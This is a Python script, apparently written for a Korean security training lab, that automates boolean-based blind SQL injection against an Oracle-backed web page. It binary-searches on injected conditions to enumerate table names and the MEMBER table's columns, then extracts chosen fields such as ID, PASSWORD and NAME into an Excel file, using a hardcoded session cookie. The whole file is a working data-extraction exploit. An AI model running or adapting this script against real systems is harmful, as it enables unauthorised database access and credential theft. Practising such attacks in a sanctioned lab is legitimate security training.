import requests
import pandas as pd
import os
import time
import urllib.parse
from pathlib import Path
import math

# --------- 설정 영역 ----------
BASE_URL = "https://lab.eqst.co.kr:8110/practice/practice01/detail?id=61"
COOKIES = {
    "JSESSIONID": "B3A09A80DFA61D192D4621B47E59D175"
}
REQUEST_TIMEOUT = 10
RETRY_COUNT = 2
SLEEP_BETWEEN_REQUESTS = 0.08
# --------------------------------

def send_get(url: str):
    """GET 요청(재시도 포함)"""
    for attempt in range(RETRY_COUNT + 1):
        try:
            resp = requests.get(url, cookies=COOKIES, timeout=REQUEST_TIMEOUT)
            return resp
        except requests.RequestException:
            if attempt >= RETRY_COUNT:
                raise
            time.sleep(0.3)
    return None

def binary_find(query: str, max_value: int = 65535) -> int:
    """Boolean-based blind 이진탐색"""
    low, high = 1, max_value
    while low < high:
        mid = (low + high) // 2
        encoded = urllib.parse.quote(f"({query}) > {mid}", safe="")
        attack_url = f"{BASE_URL} and {encoded}"
        resp = send_get(attack_url)
        if not resp:
            raise RuntimeError("응답 없음")
        text = resp.text
        time.sleep(SLEEP_BETWEEN_REQUESTS)
        if "애플워치" in text:
            low = mid + 1
        else:
            high = mid
    return high

def safe_chr(code: int) -> str:
    try:
        return chr(code)
    except:
        return "?"

def get_desktop_path() -> str:
    desktop = Path.home() / "Desktop"
    if desktop.exists():
        return str(desktop)
    alt = Path.home() / "바탕 화면"
    if alt.exists():
        return str(alt)
    return str(Path.cwd())

# ---------------- NAME 복원용 ----------------
def extract_korean_value(col: str) -> str:
    """NAME 컬럼(한글) 복원"""
    reg_q = f"select regexp_count({col}, '.') from (select {col}, rownum r from MEMBER) where r=1"
    try:
        char_len = binary_find(reg_q, 255)
    except:
        l_q = f"select length({col}) from (select {col}, rownum r from MEMBER) where r=1"
        lb_q = f"select lengthb({col}) from (select {col}, rownum r from MEMBER) where r=1"
        try:
            l_val = binary_find(l_q, 255)
            lb_val = binary_find(lb_q, 65535)
            char_len = l_val if l_val > 0 else math.ceil(lb_val / 3)
        except:
            char_len = 0

    print(f"DEBUG: NAME 글자수 = {char_len}")
    value = ""
    for pos in range(1, char_len + 1):
        # dump 결과 직접 출력
        dump_expr = f"dump(substr({col},{pos},1),1016)"
        debug_q = f"select {dump_expr} from (select {col}, rownum r from MEMBER) where r=1"
        print(f"\nDEBUG dump 결과 pos={pos}:")
        print(debug_q)
        print("↓ 결과를 브라우저나 SQL콘솔에서 실행해 실제 dump 결과를 확인해 주세요.\n")

        # Oracle UTF16 가정 (임시 변환 시도)
        try:
            hex_q = (
                f"select to_number(substr({dump_expr}, instr({dump_expr}, ':')+2, 10), 'XXXX') "
                f"from (select {col}, rownum r from MEMBER) where r=1"
            )
            code = binary_find(hex_q, 65535)
            value += safe_chr(code)
        except Exception as e:
            print(f"⚠️ dump 변환 실패 (pos={pos}): {e}")
            value += "?"
    return value
# --------------------------------------------

def main():
    print("전체 테이블 개수 조회...")
    count_q = "select count(table_name) from user_tables"
    table_count = binary_find(count_q, 255)
    print(f"전체 테이블 개수: {table_count}개\n")

    all_tables = []
    for rownum in range(1, table_count + 1):
        len_q = f"select length(a) from (select table_name a, rownum b from user_tables) where b={rownum}"
        t_len = binary_find(len_q, 255)
        t_name = ""
        for pos in range(1, t_len + 1):
            ascii_q = f"select ascii(substr(a,{pos},1)) from (select table_name a, rownum b from user_tables) where b={rownum}"
            code = binary_find(ascii_q, 255)
            t_name += safe_chr(code)
        all_tables.append(t_name)
        print(f"{rownum}번째 테이블명: {t_name}")

    if "MEMBER" not in [t.upper() for t in all_tables]:
        print("MEMBER 테이블이 없습니다.")
        return

    print("\n[+] MEMBER 컬럼명 추출 중...")
    col_count_q = "select count(column_name) from user_tab_columns where table_name='MEMBER'"
    col_count = binary_find(col_count_q, 255)
    print(f"컬럼 개수: {col_count}\n")

    columns = []
    for cnum in range(1, col_count + 1):
        len_q = f"select length(a) from (select column_name a, rownum b from user_tab_columns where table_name='MEMBER') where b={cnum}"
        c_len = binary_find(len_q, 255)
        c_name = ""
        for pos in range(1, c_len + 1):
            ascii_q = f"select ascii(substr(a,{pos},1)) from (select column_name a, rownum b from user_tab_columns where table_name='MEMBER') where b={cnum}"
            code = binary_find(ascii_q, 255)
            c_name += safe_chr(code)
        columns.append(c_name)
        print(f"{cnum}번째 컬럼명: {c_name}")

    print("\n[+] 추출할 컬럼명을 입력하세요 (예: ID, PASSWORD, NAME)")
    user_input = input("입력: ").strip()
    chosen = [x.strip().upper() for x in user_input.split(",")]
    chosen = [c for c in chosen if c in [x.upper() for x in columns]]
    if not chosen:
        print("선택한 컬럼이 없습니다.")
        return

    result = {c: [] for c in chosen}
    for col in chosen:
        print(f"\n--- {col} 추출 중 ---")
        if col == "NAME":
            value = extract_korean_value(col)
        else:
            len_q = f"select length({col}) from (select {col}, rownum r from MEMBER) where r=1"
            c_len = binary_find(len_q, 255)
            value = ""
            for pos in range(1, c_len + 1):
                ascii_q = f"select ascii(substr({col},{pos},1)) from (select {col}, rownum r from MEMBER) where r=1"
                code = binary_find(ascii_q, 255)
                value += safe_chr(code)
        result[col].append(value)
        print(f"{col}: {value}")

    save = input("\n엑셀로 저장하시겠습니까? (yes/no): ").strip().lower()
    if save == "yes":
        df = pd.DataFrame(result)
        path = os.path.join(get_desktop_path(), "MEMBER_data.xlsx")
        try:
            with pd.ExcelWriter(path, engine="openpyxl") as writer:
                df.to_excel(writer, index=False, sheet_name="MEMBER")
            print(f"\n✅ 저장 완료: {path}")
        except PermissionError:
            alt = os.path.join(str(Path.cwd()), "MEMBER_data.xlsx")
            df.to_excel(alt, index=False, sheet_name="MEMBER")
            print(f"\n⚠️ 데스크탑 저장 실패. 대신 {alt} 에 저장됨")
    else:
        print("🚫 엑셀 저장하지 않고 종료합니다.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n사용자 중단.")
    except Exception as e:
        print(f"\n오류 발생: {e}")
